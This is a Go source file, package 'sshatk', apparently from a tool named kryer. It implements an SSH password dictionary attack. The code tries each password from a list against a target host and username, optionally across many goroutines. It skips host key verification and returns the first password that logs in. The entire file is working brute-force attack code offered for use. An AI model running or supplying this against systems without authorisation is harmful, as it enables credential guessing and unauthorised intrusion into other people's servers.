package sshatk

import (
	"errors"
	"net"
	"strings"
	"sync"

	"github.com/cfschilham/kryer/pkg/workers"
	"golang.org/x/crypto/ssh"
)

// Options is used to set the options of a dictionary attack function.
type Options struct {
	Addr,
	Port,
	Username string
	Pwds       []string
	Goroutines int
}

// dial attempts to establish a connection with the passed credentials. A nil
// error will be returned if successful and vice versa.
func dial(addr, port, username, pwd string) error {
	clientConfig := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(pwd),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	// Attempt to connect to remote host.
	conn, err := ssh.Dial("tcp", net.JoinHostPort(addr, port), clientConfig)
	if err != nil {
		return err
	}
	conn.Close()
	return nil
}

// afterFunc sends true to the returned channel after the completion of the passed
// function.
func afterFunc(fn func()) chan bool {
	c := make(chan bool)
	go func(fn func(), c chan bool) {
		fn()
		c <- true
	}(fn, c)
	return c
}

// isAuth returns whether an error is an authentication error or not. Returns false
// if err is nil.
func isAuth(err error) bool {
	if err == nil {
		return false
	}
	return strings.Contains(err.Error(), "ssh: unable to authenticate")
}

// Dict performs a dictionary attack with the passed options.
func Dict(opts Options) (string, error) {
	if opts.Addr == "" {
		return "", errors.New("sshatk: opts.Addr is unset")
	}
	if opts.Port == "" {
		opts.Port = "22"
	}
	if opts.Username == "" {
		return "", errors.New("sshatk: opts.Username is unset")
	}
	if opts.Pwds == nil {
		return "", errors.New("sshatk: opts.Pwds is unset")
	}
	if opts.Goroutines < 1 {
		return "", errors.New("sshatk: opts.Goroutines is < 1")
	}

	if opts.Goroutines == 1 {
		return dictST(opts.Addr, opts.Port, opts.Username, opts.Pwds)
	}
	return dictMT(opts.Addr, opts.Port, opts.Username, opts.Pwds, opts.Goroutines)
}

func dictMT(addr, port, username string, pwds []string, goroutines int) (string, error) {
	pool, err := workers.NewPool(goroutines)
	if err != nil {
		return "", err
	}

	// Transmissions over these channels will cause the dictionary attack to be ended
	// early. A found password or a non-auth error are a good reason to do so.
	pwdChan, errChan := make(chan string), make(chan error)

	workerWG := &sync.WaitGroup{}
	workerWG.Add(len(pwds))

	task := workers.Task{
		Fn: func(params []interface{}) {
			var (
				addr     = params[0].(string)
				port     = params[1].(string)
				username = params[2].(string)
				pwd      = params[3].(string)
				pwdChan  = params[4].(chan string)
				errChan  = params[5].(chan error)
				workerWG = params[6].(*sync.WaitGroup)
			)
			defer workerWG.Done()
			err := dial(addr, port, username, pwd)
			if isAuth(err) {
				// Auth errors are not transmitted over errChan as this causes the pool to
				// be dismissed.
				return
			}
			if err != nil {
				select {
				case errChan <- err:
				default:
				}
				return
			}
			pwdChan <- pwd
		},
	}

	for _, pwd := range pwds {
		task.Params = []interface{}{addr, port, username, pwd, pwdChan, errChan, workerWG}
		if err := pool.QueueTask(task); err != nil {
			return "", err
		}
	}

	if err := pool.Start(); err != nil {
		return "", err
	}
	defer pool.Close()

	select {
	case pwd := <-pwdChan:
		return pwd, nil
	case err := <-errChan:
		return "", errors.New("unable to connect: " + err.Error())
	case <-afterFunc(workerWG.Wait):
		return "", errors.New("unable to authenticate")
	}
}

func dictST(addr, port, username string, pwds []string) (string, error) {
	for _, pwd := range pwds {
		err := dial(addr, port, username, pwd)
		if isAuth(err) {
			continue
		}
		if err != nil {
			return "", errors.New("unable to connect: " + err.Error())
		}
		return pwd, nil
	}
	return "", errors.New("unable to authenticate")
}
